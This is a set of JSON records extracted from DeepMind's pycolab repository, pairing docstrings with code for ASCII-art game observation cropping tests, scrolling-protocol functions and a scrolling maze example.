{"docstring": "\"\"\"Fixed croppers crop the designated part of the observation.\"\"\"\n# All cropping in cropping.py uses the same cropping helper method, so\n# with this text and the next one we try to cover a diverse range of\n# cropping situations.\n\n# Our test takes place in this world.\n", "func_signal": "def testFixedCropper(self):\n", "code": "art = ['.......',\n       '.#####.',\n       '.#   #.',\n       '.# P #.',\n       '.#   #.',\n       '.#####.',\n       '.......']\n\n# Build several fixed croppers focusing on different parts of the board. All\n# have the same size, which lets us use zip to make our art easier to read.\ncroppers = [\n    # These croppers extend beyond all four corners of the game board,\n    # allowing us to test the padding functionality.\n    cropping.FixedCropper((-1, -1), rows=4, cols=4, pad_char=' '),\n    cropping.FixedCropper((-1, 4), rows=4, cols=4, pad_char=' '),\n    cropping.FixedCropper((4, -1), rows=4, cols=4, pad_char=' '),\n    cropping.FixedCropper((4, 4), rows=4, cols=4, pad_char=' '),\n    # This cropper sits right in the middle and requires no padding.\n    cropping.FixedCropper((1, 1), rows=4, cols=4),\n]\n\n# In a fresh engine, execute some actions and check for expected crops.\n# pylint: disable=bad-whitespace\nself.assertMachinima(\n    engine=self.make_engine(art, croppers),\n    croppers=croppers,\n    frames=[\n        ('stay',  # The action, and cropped observations below.\n         zip(['    ',   '    ',   ' .# ',   ' #. ',   '####'],\n             [' ...',   '... ',   ' .##',   '##. ',   '#   '],\n             [' .##',   '##. ',   ' ...',   '... ',   '# P '],\n             [' .# ',   ' #. ',   '    ',   '    ',   '#   '])),\n\n        ('nw',\n         zip(['    ',   '    ',   ' .# ',   ' #. ',   '####'],\n             [' ...',   '... ',   ' .##',   '##. ',   '#P  '],\n             [' .##',   '##. ',   ' ...',   '... ',   '#   '],\n             [' .#P',   ' #. ',   '    ',   '    ',   '#   '])),\n\n        ('e',\n         zip(['    ',   '    ',   ' .# ',   ' #. ',   '####'],\n             [' ...',   '... ',   ' .##',   '##. ',   '# P '],\n             [' .##',   '##. ',   ' ...',   '... ',   '#   '],\n             [' .# ',   ' #. ',   '    ',   '    ',   '#   '])),\n\n        ('e',\n         zip(['    ',   '    ',   ' .# ',   ' #. ',   '####'],\n             [' ...',   '... ',   ' .##',   '##. ',   '#  P'],\n             [' .##',   '##. ',   ' ...',   '... ',   '#   '],\n             [' .# ',   'P#. ',   '    ',   '    ',   '#   '])),\n\n        ('s',\n         zip(['    ',   '    ',   ' .# ',   ' #. ',   '####'],\n             [' ...',   '... ',   ' .##',   '##. ',   '#   '],\n             [' .##',   '##. ',   ' ...',   '... ',   '#  P'],\n             [' .# ',   ' #. ',   '    ',   '    ',   '#   '])),\n\n        ('s',\n         zip(['    ',   '    ',   ' .# ',   'P#. ',   '####'],\n             [' ...',   '... ',   ' .##',   '##. ',   '#   '],\n             [' .##',   '##. ',   ' ...',   '... ',   '#   '],\n             [' .# ',   ' #. ',   '    ',   '    ',   '#  P'])),\n\n        ('w',\n         zip(['    ',   '    ',   ' .# ',   ' #. ',   '####'],\n             [' ...',   '... ',   ' .##',   '##. ',   '#   '],\n             [' .##',   '##. ',   ' ...',   '... ',   '#   '],\n             [' .# ',   ' #. ',   '    ',   '    ',   '# P '])),\n\n        ('w',\n         zip(['    ',   '    ',   ' .#P',   ' #. ',   '####'],\n             [' ...',   '... ',   ' .##',   '##. ',   '#   '],\n             [' .##',   '##. ',   ' ...',   '... ',   '#   '],\n             [' .# ',   ' #. ',   '    ',   '    ',   '#P  '])),\n    ],\n)\n# pylint: enable=bad-whitespace", "path": "pycolab\\tests\\cropping_test.py", "repo_name": "deepmind/pycolab", "stars": 654, "license": "apache-2.0", "language": "python", "size": 448}
{"docstring": "\"\"\"Cropping works even for strange cropping sizes and locations.\"\"\"\n# All cropping in cropping.py uses the same cropping helper method, so\n# with this text and the prior one we try to cover a diverse range of\n# cropping situations.\n\n# Our test takes place in this world.\n", "func_signal": "def testWeirdFixedCrops(self):\n", "code": "art = ['.......',\n       '.#####.',\n       '.#P  #.',\n       '.#   #.',\n       '.#   #.',\n       '.#####.',\n       '.......']\n\n# Build several fixed croppers that crop in assorted odd ways.\ncroppers = [\n    # Extends beyond the original observation on all sides.\n    cropping.FixedCropper((-1, -2), rows=9, cols=11, pad_char=' '),\n    # A 1x1 crop right on the agent.\n    cropping.FixedCropper((2, 2), rows=1, cols=1),\n    # A long, short crop right through the agent.\n    cropping.FixedCropper((2, -2), rows=1, cols=11, pad_char=' '),\n    # A tall, skinny crop right through the agent.\n    cropping.FixedCropper((-2, 2), rows=11, cols=1, pad_char=' '),\n    # Altogether ouside of the observation.\n    cropping.FixedCropper((-4, -4), rows=2, cols=2, pad_char=' '),\n    # This, too\n    cropping.FixedCropper((14, 14), rows=2, cols=2, pad_char=' '),\n]\n\n# In a fresh engine, execute some actions and check for expected crops.\nself.assertMachinima(\n    engine=self.make_engine(art, croppers),\n    croppers=croppers,\n    frames=[\n        ('stay',            # After executing this action...\n         [['           ',\n           '  .......  ',   # ...we expect this from the first cropper...\n           '  .#####.  ',\n           '  .#P  #.  ',\n           '  .#   #.  ',\n           '  .#   #.  ',\n           '  .#####.  ',\n           '  .......  ',\n           '           '],\n\n          ['P'],            # ...and this from the second cropper...\n\n          ['  .#P  #.  '],  # ...and this from the third...\n\n          [c for c in '  .#P  #.  '],  # ...and this from the fourth...\n\n          ['  ',            # ...fifth...\n           '  '],\n\n          ['  ',            # ...and the sixth.\n           '  ']]),\n    ],\n)", "path": "pycolab\\tests\\cropping_test.py", "repo_name": "deepmind/pycolab", "stars": 654, "license": "apache-2.0", "language": "python", "size": 448}
{"docstring": "\"\"\"Indicate next permissible motions for the egocentric entity `entity`.\n\nAlthough it's mentioned in the argument description, it's worth pointing out\nthat these are motions that will be permissible for `entity` in the next\ngame iteration, not in the current one.\n\nIt is fine for the same entity to call this function more than once in the\nsame game iteration, as long as `scrolling_group` is always the same.\n\nSee the section \"On the loose interpretation of 'legal' scrolling motions\"\nfor a disappointing but necessary complication of the semantics of this\nfunction.\n\nArgs:\n  entity: the egocentric pycolab game entity giving permission for\n      certain scrolling motions during the next game iteration.\n  the_plot: the pycolab game's `Plot` object.\n  motions: an iterable of scrolling motions that will be allowable *during the\n      next game iteration*. These motions are 2-tuples which can be\n      interpreted as the (possibly negative) number of rows/columns that the\n      game window is allowed to move downward/rightward over the game board;\n      or, conveniently, this is a (sub?)set of valid (\u03b4row, \u03b4column) motions\n      that `entity` will be able to make at the next iteration (the numbers\n      are the same either way).\n  scrolling_group: a string identifier for the scrolling group for which\n      `entity` is granting scrolling permission.\n\nRaises:\n  TypeError: `entity` is not a pycolab entity.\n  Error: `entity` is known to belong to a scrolling group distinct from\n      `scrolling_group`, or `entity` is not registered as egocentric within\n      `scrolling_group`.\n\"\"\"\n", "func_signal": "def permit(entity, the_plot, motions, scrolling_group=''):\n", "code": "_check_scrolling_group(entity, the_plot, scrolling_group)\n\n# Make certain this entity is an egocentric entity.\negocentrists = the_plot.setdefault(\n    'scrolling_{}_egocentrists'.format(scrolling_group), set())\nif entity not in egocentrists:\n  raise Error(\n      '{} is not registered as an egocentric entity in scrolling group '\n      '{}'.format(_entity_string_for_errors(entity), repr(scrolling_group)))\n\n# This is the game iteration for which we are giving scrolling motion\n# permission.\nmy_permit_frame = the_plot.frame + 1\n\n# See whether there is any old permission information around for this entity,\n# and clear it if so. While we're at it, update the frame number associated\n# with this entity's permission information.\nall_permit_frames = the_plot.setdefault(\n    'scrolling_{}_permitted_frame'.format(scrolling_group), dict())\nall_permits = the_plot.setdefault(\n    'scrolling_{}_permitted'.format(scrolling_group), dict())\nmy_permits = all_permits.setdefault(entity, set())\n\nif all_permit_frames.setdefault(entity, my_permit_frame) != my_permit_frame:\n  all_permit_frames[entity] = my_permit_frame\n  my_permits.clear()\n\n# Add the argument motions to the set of permitted motions.\nmy_permits.update(motions)", "path": "pycolab\\protocols\\scrolling.py", "repo_name": "deepmind/pycolab", "stars": 654, "license": "apache-2.0", "language": "python", "size": 448}
{"docstring": "\"\"\"Scrolling margins work, interacting with board edges as intended.\"\"\"\n\n# Our test takes place in this world.\n", "func_signal": "def testScrollingMargins(self):\n", "code": "art = ['.........',\n       '. ; ; ; .',\n       '.; , , ;.',\n       '. , . , .',\n       '.; .P. ;.',\n       '. , . , .',\n       '.; , , ;.',\n       '. ; ; ; .',\n       '.........']\n\n# Our six croppers are the Cartesian product of:\n#   margin is on { vertical edges; horizontal edges; both edges }\n# and\n#   the scrolling window { can; cannot } go beyond the edge of the board.\n# And to be clear, \"no margin\" means egocentric scrolling---in a sense, the\n# tightest possible margins.\ncroppers = [\n    cropping.ScrollingCropper(  # Margins on vertical edges,\n        rows=5, cols=5, to_track=['P'],  # can overlap the board's edge.\n        scroll_margins=(None, 1), pad_char=' '),\n    cropping.ScrollingCropper(           # cannot overlap the board's edge.\n        rows=5, cols=5, to_track=['P'],\n        scroll_margins=(None, 1)),\n\n    cropping.ScrollingCropper(  # Margins on horizontal edges,\n        rows=5, cols=5, to_track=['P'],  # can overlap the board's edge.\n        scroll_margins=(1, None), pad_char=' '),\n    cropping.ScrollingCropper(           # cannot overlap the board's edge.\n        rows=5, cols=5, to_track=['P'],\n        scroll_margins=(1, None)),\n\n    cropping.ScrollingCropper(  # Margins on both edges,\n        rows=5, cols=5, to_track=['P'],  # can overlap the board's edge.\n        scroll_margins=(1, 1), pad_char=' '),\n    cropping.ScrollingCropper(           # cannot overlap the board's edge.\n        rows=5, cols=5, to_track=['P'],\n        scroll_margins=(1, 1)),\n]\n\n# In a fresh engine, walk the Sprite westward and check for expected crops.\n# pylint: disable=bad-whitespace\nself.assertMachinima(\n    engine=self.make_engine(art, croppers),\n    croppers=croppers,\n    frames=[\n        ('w',\n         zip([' , , ',  ' , , ',  '; , ,',  '; , ,',  ' , , ',  ' , , '],\n             [', . ,',  ', . ,',  ' , . ',  ' , . ',  ', . ,',  ', . ,'],\n             [' P . ',  ' P . ',  '; P .',  '; P .',  ' P . ',  ' P . '],\n             [', . ,',  ', . ,',  ' , . ',  ' , . ',  ', . ,',  ', . ,'],\n             [' , , ',  ' , , ',  '; , ,',  '; , ,',  ' , , ',  ' , , '])),\n\n        ('w',\n         zip(['; , ,',  '; , ,',  '.; , ',  '.; , ',  '; , ,',  '; , ,'],\n             [' , . ',  ' , . ',  '. , .',  '. , .',  ' , . ',  ' , . '],\n             [';P. .',  ';P. .',  '.;P. ',  '.;P. ',  ';P. .',  ';P. .'],\n             [' , . ',  ' , . ',  '. , .',  '. , .',  ' , . ',  ' , . '],\n             ['; , ,',  '; , ,',  '.; , ',  '.; , ',  '; , ,',  '; , ,'])),\n\n        ('w',\n         zip(['.; , ',  '.; , ',  ' .; ,',  '.; , ',  '.; , ',  '.; , '],\n             ['. , .',  '. , .',  ' . , ',  '. , .',  '. , .',  '. , .'],\n             ['.P . ',  '.P . ',  ' .P .',  '.P . ',  '.P . ',  '.P . '],\n             ['. , .',  '. , .',  ' . , ',  '. , .',  '. , .',  '. , .'],\n             ['.; , ',  '.; , ',  ' .; ,',  '.; , ',  '.; , ',  '.; , '])),\n\n        ('w',\n         zip([' .; ,',  '.; , ',  '  .; ',  '.; , ',  ' .; ,',  '.; , '],\n             [' . , ',  '. , .',  '  . ,',  '. , .',  ' . , ',  '. , .'],\n             [' P; .',  'P; . ',  '  P; ',  'P; . ',  ' P; .',  'P; . '],\n             [' . , ',  '. , .',  '  . ,',  '. , .',  ' . , ',  '. , .'],\n             [' .; ,',  '.; , ',  '  .; ',  '.; , ',  ' .; ,',  '.; , '])),\n    ],\n)\n\n# In a fresh engine, walk the Sprite eastward and check for expected crops.\nself.assertMachinima(\n    engine=self.make_engine(art, croppers),\n    croppers=croppers,\n    frames=[\n        ('e',\n         zip([' , , ',  ' , , ',  ', , ;',  ', , ;',  ' , , ',  ' , , '],\n             [', . ,',  ', . ,',  ' . , ',  ' . , ',  ', . ,',  ', . ,'],\n             [' . P ',  ' . P ',  '. P ;',  '. P ;',  ' . P ',  ' . P '],\n             [', . ,',  ', . ,',  ' . , ',  ' . , ',  ', . ,',  ', . ,'],\n             [' , , ',  ' , , ',  ', , ;',  ', , ;',  ' , , ',  ' , , '])),\n\n        ('e',\n         zip([', , ;',  ', , ;',  ' , ;.',  ' , ;.',  ', , ;',  ', , ;'],\n             [' . , ',  ' . , ',  '. , .',  '. , .',  ' . , ',  ' . , '],\n             ['. .P;',  '. .P;',  ' .P;.',  ' .P;.',  '. .P;',  '. .P;'],\n             [' . , ',  ' . , ',  '. , .',  '. , .',  ' . , ',  ' . , '],\n             [', , ;',  ', , ;',  ' , ;.',  ' , ;.',  ', , ;',  ', , ;'])),\n\n        ('e',\n         zip([' , ;.',  ' , ;.',  ', ;. ',  ' , ;.',  ' , ;.',  ' , ;.'],\n             ['. , .',  '. , .',  ' , . ',  '. , .',  '. , .',  '. , .'],\n             [' . P.',  ' . P.',  '. P. ',  ' . P.',  ' . P.',  ' . P.'],\n             ['. , .',  '. , .',  ' , . ',  '. , .',  '. , .',  '. , .'],\n             [' , ;.',  ' , ;.',  ', ;. ',  ' , ;.',  ' , ;.',  ' , ;.'])),\n\n        ('e',\n         zip([', ;. ',  ' , ;.',  ' ;.  ',  ' , ;.',  ', ;. ',  ' , ;.'],\n             [' , . ',  '. , .',  ', .  ',  '. , .',  ' , . ',  '. , .'],\n             ['. ;P ',  ' . ;P',  ' ;P  ',  ' . ;P',  '. ;P ',  ' . ;P'],\n             [' , . ',  '. , .',  ', .  ',  '. , .',  ' , . ',  '. , .'],\n             [', ;. ',  ' , ;.',  ' ;.  ',  ' , ;.',  ', ;. ',  ' , ;.'])),\n    ],\n)\n\n# In a fresh engine, walk the Sprite northward and check for expected crops.\nself.assertMachinima(\n    engine=self.make_engine(art, croppers),\n    croppers=croppers,\n    frames=[\n        ('n',\n         zip(['; ; ;',  '; ; ;',  ' , , ',  ' , , ',  ' , , ',  ' , , '],\n             [' , , ',  ' , , ',  ', P ,',  ', P ,',  ', P ,',  ', P ,'],\n             [', P ,',  ', P ,',  ' . . ',  ' . . ',  ' . . ',  ' . . '],\n             [' . . ',  ' . . ',  ', . ,',  ', . ,',  ', . ,',  ', . ,'],\n             [', . ,',  ', . ,',  ' , , ',  ' , , ',  ' , , ',  ' , , '])),\n\n        ('n',\n         zip(['.....',  '.....',  '; ; ;',  '; ; ;',  '; ; ;',  '; ; ;'],\n             ['; ; ;',  '; ; ;',  ' ,P, ',  ' ,P, ',  ' ,P, ',  ' ,P, '],\n             [' ,P, ',  ' ,P, ',  ', . ,',  ', . ,',  ', . ,',  ', . ,'],\n             [', . ,',  ', . ,',  ' . . ',  ' . . ',  ' . . ',  ' . . '],\n             [' . . ',  ' . . ',  ', . ,',  ', . ,',  ', . ,',  ', . ,'])),\n\n        ('n',\n         zip(['     ',  '.....',  '.....',  '.....',  '.....',  '.....'],\n             ['.....',  '; P ;',  '; P ;',  '; P ;',  '; P ;',  '; P ;'],\n             ['; P ;',  ' , , ',  ' , , ',  ' , , ',  ' , , ',  ' , , '],\n             [' , , ',  ', . ,',  ', . ,',  ', . ,',  ', . ,',  ', . ,'],\n             [', . ,',  ' . . ',  ' . . ',  ' . . ',  ' . . ',  ' . . '])),\n\n        ('n',\n         zip(['     ',  '..P..',  '     ',  '..P..',  '     ',  '..P..'],\n             ['     ',  '; ; ;',  '..P..',  '; ; ;',  '..P..',  '; ; ;'],\n             ['..P..',  ' , , ',  '; ; ;',  ' , , ',  '; ; ;',  ' , , '],\n             ['; ; ;',  ', . ,',  ' , , ',  ', . ,',  ' , , ',  ', . ,'],\n             [' , , ',  ' . . ',  ', . ,',  ' . . ',  ', . ,',  ' . . '])),\n    ],\n)\n\n# In a fresh engine, walk the Sprite southward and check for expected crops.\nself.assertMachinima(\n    engine=self.make_engine(art, croppers),\n    croppers=croppers,\n    frames=[\n        ('s',\n         zip([', . ,',  ', . ,',  ' , , ',  ' , , ',  ' , , ',  ' , , '],\n             [' . . ',  ' . . ',  ', . ,',  ', . ,',  ', . ,',  ', . ,'],\n             [', P ,',  ', P ,',  ' . . ',  ' . . ',  ' . . ',  ' . . '],\n             [' , , ',  ' , , ',  ', P ,',  ', P ,',  ', P ,',  ', P ,'],\n             ['; ; ;',  '; ; ;',  ' , , ',  ' , , ',  ' , , ',  ' , , '])),\n\n        ('s',\n         zip([' . . ',  ' . . ',  ', . ,',  ', . ,',  ', . ,',  ', . ,'],\n             [', . ,',  ', . ,',  ' . . ',  ' . . ',  ' . . ',  ' . . '],\n             [' ,P, ',  ' ,P, ',  ', . ,',  ', . ,',  ', . ,',  ', . ,'],\n             ['; ; ;',  '; ; ;',  ' ,P, ',  ' ,P, ',  ' ,P, ',  ' ,P, '],\n             ['.....',  '.....',  '; ; ;',  '; ; ;',  '; ; ;',  '; ; ;'])),\n\n        ('s',\n         zip([', . ,',  ' . . ',  ' . . ',  ' . . ',  ' . . ',  ' . . '],\n             [' , , ',  ', . ,',  ', . ,',  ', . ,',  ', . ,',  ', . ,'],\n             ['; P ;',  ' , , ',  ' , , ',  ' , , ',  ' , , ',  ' , , '],\n             ['.....',  '; P ;',  '; P ;',  '; P ;',  '; P ;',  '; P ;'],\n             ['     ',  '.....',  '.....',  '.....',  '.....',  '.....'])),\n\n        ('s',\n         zip([' , , ',  ' . . ',  ', . ,',  ' . . ',  ', . ,',  ' . . '],\n             ['; ; ;',  ', . ,',  ' , , ',  ', . ,',  ' , , ',  ', . ,'],\n             ['..P..',  ' , , ',  '; ; ;',  ' , , ',  '; ; ;',  ' , , '],\n             ['     ',  '; ; ;',  '..P..',  '; ; ;',  '..P..',  '; ; ;'],\n             ['     ',  '..P..',  '     ',  '..P..',  '     ',  '..P..'])),\n    ],\n)\n# pylint: enable=bad-whitespace", "path": "pycolab\\tests\\cropping_test.py", "repo_name": "deepmind/pycolab", "stars": 654, "license": "apache-2.0", "language": "python", "size": 448}
{"docstring": "\"\"\"`ScrollingCropper` can \"saccade\" correctly between scroll targets.\"\"\"\n\n# Our test takes place in this world.\n", "func_signal": "def testScrollingSaccade(self):\n", "code": "art = [' . . . ',\n       '. . . .',\n       ' . . . ',\n       '. .P. .',  # The agent...\n       ' . .%% ',\n       '. .%%%.',  # ...and a blobby drape.\n       ' . %%. ']\n\n# We have two kinds of egocentric croppers: one that can saccade between\n# scroll targets (i.e. if its scroll target moves more than one pixel in any\n# direction, it jumps to follow it) and one that does not. In this test, we\n# name two scrolling targets: the highest priority is the Sprite 'P', and\n# the Drape '%' is the lowest priority. Both can crop a region outside of\n# the game board.\ncroppers = [\n    cropping.ScrollingCropper(\n        rows=3, cols=5, to_track=['P', '%'],\n        scroll_margins=(None, None), pad_char=' ', saccade=True),\n    cropping.ScrollingCropper(\n        rows=3, cols=5, to_track=['P', '%'],\n        scroll_margins=(None, None), pad_char=' ', saccade=False),\n]\n\n# In a fresh engine, walk the Sprite around; we check for expected crops.\n# pylint: disable=bad-whitespace\nself.assertMachinima(\n    engine=self.make_engine(art, croppers),\n    croppers=croppers,\n    frames=[\n        # The first three steps to the west proceed normally.\n        ('w',\n         zip([' . . ',   ' . . '],\n             ['. P .',   '. P .'],\n             [' . .%',   ' . .%'])),\n\n        ('w',\n         zip(['  . .',   '  . .'],\n             [' .P. ',   ' .P. '],\n             ['  . .',   '  . .'])),\n\n        ('w',\n         zip(['   . ',   '   . '],    # So far, so normal. We're now at the\n             ['  P .',   '  P .'],    # western edge of the board.\n             ['   . ',   '   . '])),\n\n        # With this step northwest, the Sprite will \"leave the board\" and\n        # become invisible. The cropper that can saccade will jump straight\n        # to the second-priority target, while the cropper that can't\n        # saccade will wait patiently in place for a scroll target to drift\n        # back into the centre of its window.\n        ('nw',\n         zip([' .%% ',   '   . '],\n             ['.%%%.',   '  . .'],\n             [' %%. ',   '   . '])),\n\n        # Bringing the Sprite back in two rows above the place where it\n        # exited will snap the saccading cropper back into place. But it's\n        # still too far away for the non-saccading cropper.\n        ('ne',\n         zip(['   . ',   '   . '],\n             ['  P .',   '  . .'],\n             ['   . ',   '   . '])),\n\n        # But if the Sprite drops one row, it's within one step---scrolling\n        # distance---of the place where the non-saccading cropper was\n        # waiting. That's close enough for it to \"lock on\"!\n        ('s',\n         zip(['  . .',   '  . .'],\n             ['  P. ',   '  P. '],\n             ['  . .',   '  . .'])),\n    ],\n)\n# pylint: enable=bad-whitespace", "path": "pycolab\\tests\\cropping_test.py", "repo_name": "deepmind/pycolab", "stars": 654, "license": "apache-2.0", "language": "python", "size": 448}
{"docstring": "\"\"\"Constructor: just tells `MazeWalker` we can't walk through walls.\"\"\"\n", "func_signal": "def __init__(self, corner, position, character):\n", "code": "super(PlayerSprite, self).__init__(\n    corner, position, character, impassable='#')", "path": "pycolab\\examples\\better_scrolly_maze.py", "repo_name": "deepmind/pycolab", "stars": 654, "license": "apache-2.0", "language": "python", "size": 448}
{"docstring": "# If the player has reached a coin, credit one reward and remove the coin\n# from the scrolling pattern. If the player has obtained all coins, quit!\n", "func_signal": "def update(self, actions, board, layers, backdrop, things, the_plot):\n", "code": "player_pattern_position = things['P'].position\n\nif self.curtain[player_pattern_position]:\n  the_plot.log('Coin collected at {}!'.format(player_pattern_position))\n  the_plot.add_reward(100)\n  self.curtain[player_pattern_position] = False\n  if not self.curtain.any(): the_plot.terminate_episode()", "path": "pycolab\\examples\\better_scrolly_maze.py", "repo_name": "deepmind/pycolab", "stars": 654, "license": "apache-2.0", "language": "python", "size": 448}
{"docstring": "\"\"\"Retrieve the current scrolling order for `scrolling_group`, if one exists.\n\nArgs:\n  entity: the pycolab game entity retrieving the scrolling order.\n  the_plot: the pycolab game's `Plot` object.\n  scrolling_group: a string identifier for the scrolling group for which\n      `entity` is requesting the current scrolling order.\n\nReturns:\n  a scrolling order for the current game iteration, or None if there is none.\n  If not None, this is a 2-tuple to be obeyed by all participants in\n  `scrolling_group`. These directions are the number of rows and the number of\n  columns that the game window will move over the world, conceptually\n  speaking, with positive row values meaning that the window moves downward,\n  and positive column values meaning that the window moves rightward.\n  Non-egocentric entities should therefore *subtract* these values from their\n  own internal screen-relative coordinates so that they appear to move along\n  with the rest of the world.\n\nRaises:\n  TypeError: `entity` is not a pycolab entity.\n  Error: `entity` is known to belong to a scrolling group distinct from\n      `scrolling_group`.\n\"\"\"\n", "func_signal": "def get_order(entity, the_plot, scrolling_group=''):\n", "code": "_check_scrolling_group(entity, the_plot, scrolling_group)\norder_frame = the_plot.setdefault(\n    'scrolling_{}_order_frame'.format(scrolling_group), None)\nif the_plot.frame != order_frame: return None\nreturn the_plot.setdefault(\n    'scrolling_{}_order'.format(scrolling_group), None)", "path": "pycolab\\protocols\\scrolling.py", "repo_name": "deepmind/pycolab", "stars": 654, "license": "apache-2.0", "language": "python", "size": 448}
{"docstring": "\"\"\"Issue a scrolling order for participants in `scrolling_group`.\n\nArgs:\n  entity: the pycolab game entity attempting to issue the scrolling order.\n  the_plot: the pycolab game's `Plot` object.\n  motion: a 2-tuple to be obeyed by all participants in `scrolling_group`.\n      These directions are the number of rows and the number of columns that\n      the game window will move over the world, conceptually speaking, with\n      positive row values meaning that the window moves downward, and positive\n      column values meaning that the window moves rightward.\n  scrolling_group: a string identifier for the scrolling group for which\n      `entity` is attempting to issue a scrolling order.\n  check_possible: if True, perform a check that ensures that `motion` is\n      compatible with all participants in `scrolling_group`.\n\nRaises:\n  TypeError: `entity` is not a pycolab entity.\n  Error: `entity` is known to belong to a scrolling group distinct from\n      `scrolling_group`; a scrolling order has already been issued for\n      `scrolling_group` at this game iteration; or `motion` is not a scrolling\n      motion that is permitted by all egocentric members of `scrolling_group`.\n\"\"\"\n", "func_signal": "def order(entity, the_plot, motion, scrolling_group='', check_possible=True):\n", "code": "_check_scrolling_group(entity, the_plot, scrolling_group)\n\n# Check that the scrolling order is permitted by all of the egocentric\n# participants in this scrolling group, and that no other scrolling order has\n# been set for this game iteration.\norder_frame = the_plot.setdefault(\n    'scrolling_{}_order_frame'.format(scrolling_group), None)\nif order_frame == the_plot.frame:\n  raise Error(\n      '{} attempted to issue a second scrolling order for scrolling group {}.'\n      ''.format(_entity_string_for_errors(entity), repr(scrolling_group)))\nif (check_possible and\n    not is_possible(entity, the_plot, motion, scrolling_group)):\n  raise Error(\n      '{} attempted to order an impossible scrolling motion \"{}\" for '\n      'scrolling group {}.'.format(_entity_string_for_errors(entity), motion,\n                                   repr(scrolling_group)))\n\n# Put the scrolling order for this scrolling group in place.\nthe_plot['scrolling_{}_order_frame'.format(scrolling_group)] = the_plot.frame\nthe_plot['scrolling_{}_order'.format(scrolling_group)] = motion", "path": "pycolab\\protocols\\scrolling.py", "repo_name": "deepmind/pycolab", "stars": 654, "license": "apache-2.0", "language": "python", "size": 448}
{"docstring": "\"\"\"Register `entity` as egocentric with respect to the scrolling group.\n\nOnce registered, any entity that wishes to check or issue a scrolling order\nwill need to make certain that scrolling the world \"around\" this entity will\nnot wind up making the entity execute an impossible move. (See `permit`,\n`is_possible` and `order`.)\n\nThere is no harm in registering more than once, as long as `scrolling_group`\nremains the same.\n\nArgs:\n  entity: the pycolab game entity we wish to register as egocentric.\n  the_plot: the pycolab game's `Plot` object.\n  scrolling_group: a string identifier for the scrolling group with respect to\n      which we are marking `entity` as egocentric.\n\nRaises:\n  TypeError: `entity` is not a pycolab entity.\n  Error: `entity` is known to belong to a scrolling group distinct from\n      `scrolling_group`.\n\"\"\"\n", "func_signal": "def participate_as_egocentric(entity, the_plot, scrolling_group=''):\n", "code": "_check_scrolling_group(entity, the_plot, scrolling_group)\negocentrists = the_plot.setdefault(\n    'scrolling_{}_egocentrists'.format(scrolling_group), set())\negocentrists.add(entity)", "path": "pycolab\\protocols\\scrolling.py", "repo_name": "deepmind/pycolab", "stars": 654, "license": "apache-2.0", "language": "python", "size": 448}
{"docstring": "\"\"\"Derive a string describing `entity` for use in error messages.\"\"\"\n", "func_signal": "def _entity_string_for_errors(entity):\n", "code": "try:\n  character = entity.character\n  return 'a Sprite or Drape handling character {}'.format(repr(character))\nexcept AttributeError:\n  return 'the Backdrop'", "path": "pycolab\\protocols\\scrolling.py", "repo_name": "deepmind/pycolab", "stars": 654, "license": "apache-2.0", "language": "python", "size": 448}
{"docstring": "\"\"\"Builds and returns a Better Scrolly Maze game for the selected level.\"\"\"\n", "func_signal": "def make_game(level):\n", "code": "return ascii_art.ascii_art_to_game(\n    MAZES_ART[level], what_lies_beneath=' ',\n    sprites={\n        'P': PlayerSprite,\n        'a': PatrollerSprite,\n        'b': PatrollerSprite,\n        'c': PatrollerSprite},\n    drapes={\n        '@': CashDrape},\n    update_schedule=['a', 'b', 'c', 'P', '@'],\n    z_order='abc@P')", "path": "pycolab\\examples\\better_scrolly_maze.py", "repo_name": "deepmind/pycolab", "stars": 654, "license": "apache-2.0", "language": "python", "size": 448}
{"docstring": "\"\"\"Builds and returns `ObservationCropper`s for the selected level.\n\nWe make three croppers for each level: one centred on the player, one centred\non one of the Patrollers (scary!), and one centred on a tantalising hoard of\ncoins somewhere in the level (motivating!)\n\nArgs:\n  level: level to make `ObservationCropper`s for.\n\nReturns:\n  a list of three `ObservationCropper`s.\n\"\"\"\n", "func_signal": "def make_croppers(level):\n", "code": "return [\n    # The player view.\n    cropping.ScrollingCropper(rows=10, cols=30, to_track=['P'],\n                              initial_offset=STARTER_OFFSET[level]),\n    # The patroller view.\n    cropping.ScrollingCropper(rows=7, cols=10, to_track=['c'],\n                              pad_char=' ', scroll_margins=(None, 3)),\n    # The teaser!\n    cropping.FixedCropper(top_left_corner=TEASER_CORNER[level],\n                          rows=12, cols=20, pad_char=' '),\n]", "path": "pycolab\\examples\\better_scrolly_maze.py", "repo_name": "deepmind/pycolab", "stars": 654, "license": "apache-2.0", "language": "python", "size": 448}
{"docstring": "\"\"\"Basic egocentric scrolling works as advertised.\"\"\"\n\n# Our test takes place in this world.\n", "func_signal": "def testEgocentricScrolling(self):\n", "code": "art = ['#######',\n       '# . . #',\n       '#. . .#',\n       '# .P. #',\n       '#. . .#',\n       '# . . #',\n       '#######']\n\n# We have two types of egocentric croppers. The first is allowed to crop a\n# region outside the board, while the second is not.\ncroppers = [\n    # We have two types of egocentric croppers. This one is allowed to have\n    # its cropping region extend outside of the game board.\n    cropping.ScrollingCropper(\n        rows=5, cols=5, to_track=['P'],\n        scroll_margins=(None, None), pad_char=' '),\n    # This one is not allowed to do that.\n    cropping.ScrollingCropper(\n        rows=5, cols=5, to_track=['P'],\n        scroll_margins=(None, None)),\n]\n\n# In a fresh engine, walk northwest and check for expected crops.\n# pylint: disable=bad-whitespace\nself.assertMachinima(\n    engine=self.make_engine(art, croppers),\n    croppers=croppers,\n    frames=[\n        ('nw',  # The action, and cropped observations below.\n         zip(['#####',   '#####'],\n             ['# . .',   '# . .'],\n             ['#.P. ',   '#.P. '],\n             ['# . .',   '# . .'],\n             ['#. . ',   '#. . '])),\n\n        ('nw',\n         zip(['     ',   '#####'],\n             [' ####',   '#P. .'],\n             [' #P. ',   '#. . '],\n             [' #. .',   '# . .'],\n             [' # . ',   '#. . '])),\n    ],\n)\n# pylint: enable=bad-whitespace\n\n# In a fresh engine, walk southeast and check for expected crops.\n# pylint: disable=bad-whitespace\nself.assertMachinima(\n    engine=self.make_engine(art, croppers),\n    croppers=croppers,\n    frames=[\n        ('se',\n         zip([' . .#',   ' . .#'],\n             ['. . #',   '. . #'],\n             [' .P.#',   ' .P.#'],\n             ['. . #',   '. . #'],\n             ['#####',   '#####'])),\n\n        ('se',\n         zip([' . # ',   ' . .#'],\n             ['. .# ',   '. . #'],\n             [' .P# ',   ' . .#'],\n             ['#### ',   '. .P#'],\n             ['     ',   '#####'])),\n    ],\n)\n# pylint: enable=bad-whitespace", "path": "pycolab\\tests\\cropping_test.py", "repo_name": "deepmind/pycolab", "stars": 654, "license": 